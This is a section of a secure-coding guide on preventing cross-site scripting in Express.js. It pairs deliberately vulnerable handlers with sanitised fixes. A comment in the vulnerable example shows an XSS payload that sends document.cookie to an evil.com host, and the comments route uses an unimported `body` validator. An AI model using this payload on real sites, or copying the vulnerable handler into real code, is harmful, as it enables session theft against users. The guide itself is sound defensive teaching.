## 2. XSS (Cross-Site Scripting) Prevention

### ❌ VULNERABLE (DO NOT USE)
```javascript
// Direct output of user input in response
app.get('/search', (req, res) => {
  const query = req.query.q;
  // DANGER: User input directly in HTML response
  res.send(`<h1>Search results for: ${query}</h1>`);
});

// Attacker can do:
// GET /search?q=<img src=x onerror="fetch('//evil.com/steal?cookie=' + document.cookie)">
// This would steal the user's cookies!

// Direct response in JSON (still unsafe if rendered as HTML)
app.get('/api/comment', (req, res) => {
  const comment = req.query.text;
  res.json({ comment: comment }); // If rendered as HTML, still vulnerable
});
```

### ✅ SECURE FIX
```javascript
const { query, validationResult } = require('express-validator');
const DOMPurify = require('isomorphic-dompurify');
const xss = require('xss');

// Sanitize HTML output
app.get('/search', 
  query('q')
    .trim()
    .isLength({ min: 1, max: 100 })
    .escape(), // Escapes HTML characters
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const query = req.query.q; // Already escaped by express-validator
    res.send(`<h1>Search results for: ${query}</h1>`);
  }
);

// For more complex HTML content
app.get('/user-profile/:id', async (req, res) => {
  try {
    const user = await User.findByPk(req.params.id);

    if (!user) return res.status(404).json({ error: 'Not found' });

    // Sanitize user-generated content
    const sanitizedBio = DOMPurify.sanitize(user.bio, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
      ALLOWED_ATTR: ['href', 'target']
    });

    res.json({
      id: user.id,
      name: user.name,
      bio: sanitizedBio // Safe to render as HTML
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// For plain text fields (JSON API)
app.post('/comments', 
  body('text')
    .trim()
    .isLength({ min: 1, max: 1000 })
    .escape(), // Escape HTML special characters
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const comment = req.body.text; // &lt;script&gt; instead of <script>

    // Store sanitized comment
    Comment.create({ text: comment });

    // When retrieved, it will be &lt;script&gt; (safe)
    res.json({ comment });
  }
);

// Content Security Policy (additional layer of defense)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

